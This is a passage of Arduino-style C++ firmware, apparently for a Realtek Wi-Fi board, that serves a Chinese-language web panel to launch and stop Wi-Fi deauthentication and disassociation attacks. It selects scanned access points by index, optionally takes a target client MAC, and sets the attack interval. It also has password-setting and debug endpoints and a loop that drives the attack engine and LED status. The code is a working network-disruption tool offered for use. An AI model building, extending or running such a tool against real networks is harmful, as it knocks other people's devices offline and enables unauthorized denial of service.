    if (deserializeJson(d, body)) { sendJsonRaw(cfd, 400, "{\"err\":\"badjson\"}"); return; }
    JsonArray arr = d["targets"].as<JsonArray>();
    if (arr.size() == 0 || arr.size() > MAX_ENG) { sendJsonRaw(cfd, 400, "{\"err\":\"targets 数量无效\"}"); return; }
    int n = g_netCnt;
    uint8_t bs[MAX_ENG][6]; uint16_t ch[MAX_ENG];
    int cnt = 0;
    for (JsonVariant v : arr) {
      int idx = v.as<int>();
      if (idx < 0 || idx >= n) { sendJsonRaw(cfd, 400, "{\"err\":\"目标无效，请重新扫描\"}"); return; }
      memcpy(bs[cnt], g_nets[idx].bssid, 6);
      ch[cnt] = g_nets[idx].ch;
      g_atkIdx[cnt] = idx;
      cnt++;
    }
    g_atkN = cnt;
    const char* meth = d["method"] | "deauth";
    uint8_t mbit = 1;
    if (!strcmp(meth, "disassoc")) mbit = 2;
    else if (!strcmp(meth, "both")) mbit = 3;
    uint32_t iv = d["interval"] | 100;
    g_manMacSet = false;
    const char* mmac = d["mac"] | "";
    if (mmac && mmac[0]) {
      unsigned v[6];
      if (sscanf(mmac, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6) {
        for (int i = 0; i < 6; i++) g_manMac[i] = (uint8_t)v[i];
        g_manMacSet = true;
      }
    }
    if (g_manMacSet) {
      for (int i = 0; i < cnt; i++) {
        if (memcmp(g_manMac, bs[i], 6) == 0) {
          sendJsonRaw(cfd, 400, "{\"err\":\"这是路由器 MAC，请填目标设备(手机/电脑)的 MAC\"}");
          return;
        }
      }
    }
    if (g_atkPhase != AK_IDLE) stopEngineOnly();
    engineStart(cnt, bs, ch, mbit, iv);
    char m[72];
    snprintf(m, sizeof m, "Deauth 启动: %d 目标 / %s / %lums", cnt, meth, (unsigned long)iv);
    logEv(m, 'o');
    sendJsonRaw(cfd, 200, "{\"ok\":true}");
    return;
  }

  if (strcmp(p, "/api/attack/stop") == 0 && isPost) {
    bool was = (g_atkPhase != AK_IDLE);
    bool needCh = (g_apChannel != 1);       // attack may have pinned the channel
    stopEngineOnly();
    if (needCh) g_restorePending = true;    // restore AP after this reply is out
    if (was) { logEv("Deauth 已停止", 'o'); sendJsonRaw(cfd, 200, "{\"ok\":true}"); }
    else sendJsonRaw(cfd, 200, "{\"ok\":false,\"err\":\"未在攻击中\"}");
    return;
  }

  if (strcmp(p, "/api/setpass") == 0 && isPost) {
    JsonDocument d;
    if (deserializeJson(d, body)) { sendJsonRaw(cfd, 400, "{\"err\":\"badjson\"}"); return; }
    const char* np = d["pass"] | "";
    int l = (int)strlen(np);
    if (l < 8 || l > 63) { sendJsonRaw(cfd, 400, "{\"err\":\"密码长度需 8-63\"}"); return; }
    for (int i = 0; i < l; i++) {
      if (np[i] < 32 || np[i] > 126) { sendJsonRaw(cfd, 400, "{\"err\":\"密码含非法字符\"}"); return; }
    }
    snprintf(g_apPass, sizeof g_apPass, "%s", np);
    cfgSave();
    logEv("热点密码已更新，正在重建热点", 'o');
    g_restorePending = true;          // rebuild after this reply is on the wire
    sendJsonRaw(cfd, 200, "{\"ok\":true}");
    return;
  }

  if (strcmp(p, "/api/dbg") == 0 && isGet) {
    JsonDocument d;
    JsonObject o = d.to<JsonObject>();
    o["fw"] = FW_VER;
    o["lfd"] = lfd;
    o["ap"] = g_apOnline;
    o["seen"] = seen;
    o["fail"] = fail;
    o["last"] = dbgLast;
    o["code"] = lastCode;
    o["scanReq"] = (bool)g_scanRequested;
    o["scanning"] = g_scanning;
    o["scanId"] = g_scanId;
    o["nets"] = g_netCnt;
    int curCh = 0; wifi_get_channel(&curCh);
    o["curCh"] = curCh;
    o["apCh"] = (int)g_apChannel;
    o["atkPhase"] = (int)g_atkPhase;
    o["frames"] = g_engFrames;
    o["txfail"] = g_engTxFail;
    o["pace"] = g_atkPace;
    o["cliCnt"] = (int)g_cliCnt;
    o["promiscFrames"] = g_promiscFrames;
    o["manMac"] = g_manMacSet ? "set" : "";
    JsonArray ech = o["engCh"].to<JsonArray>();
    for (int i = 0; i < g_engN; i++) ech.add((int)g_engCh[i]);
    o["heap"] = freeHeap();
    serializeJson(d, g_jsonBuf);
    sendJsonRaw(cfd, 200, g_jsonBuf);
    return;
  }

  if (isGet && strcmp(p, "/") == 0) {
    sendHtml(cfd, PAGE_APP);
    return;
  }
  if (isGet && strcmp(p, "/favicon.ico") == 0) {
    sendResp(cfd, 204, "image/x-icon", "", 0, NULL);
    return;
  }
  sendJsonRaw(cfd, 404, "{\"err\":\"not found\"}");
}

// ---------------------------------------------------------------------
void setup() {
  g_bootMs = millis();
  Serial.begin(115200);
  delay(100);

  // onboard RGB LED: idle green / 2.4G attack red / 5G attack blue
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  // boot colour sweep R -> G -> B (lets you tell the real channel order)
  ledSet(1, 0, 0); delay(260);
  ledSet(0, 1, 0); delay(260);
  ledSet(0, 0, 1); delay(260);
  ledSet(0, 1, 0);

  // persisted AP password (falls back to the default on a blank/invalid record)
  g_cfg = new FlashMemoryClass(CFG_ADDR, 0x1000);
  cfgLoad();

  dlog("boot deauth-only v%s heap=%lu passlen=%d", FW_VER, (unsigned long)freeHeap(), (int)strlen(g_apPass));

  // concurrent STA+AP: AP-only mode leaves no station interface and
  // wifi_scan_networks() then fails/timeouts
  WiFi.enableConcurrent();
  if (!apRebuild()) {
    delay(500);
    apRebuild();
  }
  dlog("ap online=%d ch=%d lfd-before-http=%d", g_apOnline ? 1 : 0, (int)g_apChannel, g_http.lfd);
  httpStart();
  clientsRefresh();
  logEv("管理界面: http://" AP_IP_STR "/", 'o');
}

void loop() {
  ledUpdate();

  if (g_restorePending) {
    g_restorePending = false;
    // bring the AP back to its configured channel without a rebuild when possible
    if (!apSetChannel(1)) {
      if (!apRebuild()) {
        wdt_enable(600);
        for (;;) delay(20);
      }
    }
  }

  if (g_scanRequested && !g_scanning) {
    g_scanRequested = false;
    if (g_atkPhase != AK_IDLE) stopEngineOnly();
    startScan();
  }

  scanTick();

  if (g_apOnline && g_http.lfd < 0) httpStart();

  if (!g_scanning) {
    for (int i = 0; i < 4; i++) {
      if (!g_http.serveOne()) break;
    }
    attackTick();
  }

  if (millis() - g_clientRefreshMs > 2000) {
    g_clientRefreshMs = millis();
    if (!g_scanning) clientsRefresh();
  }

  // wedge guard: a phase that never advances for 20 s -> hard reset
  if (g_atkPhase != AK_IDLE && millis() - g_atkPhaseMs > 20000) {
    dlog("attack wedged");
    wdt_enable(600);
    for (;;) delay(20);
  }
}
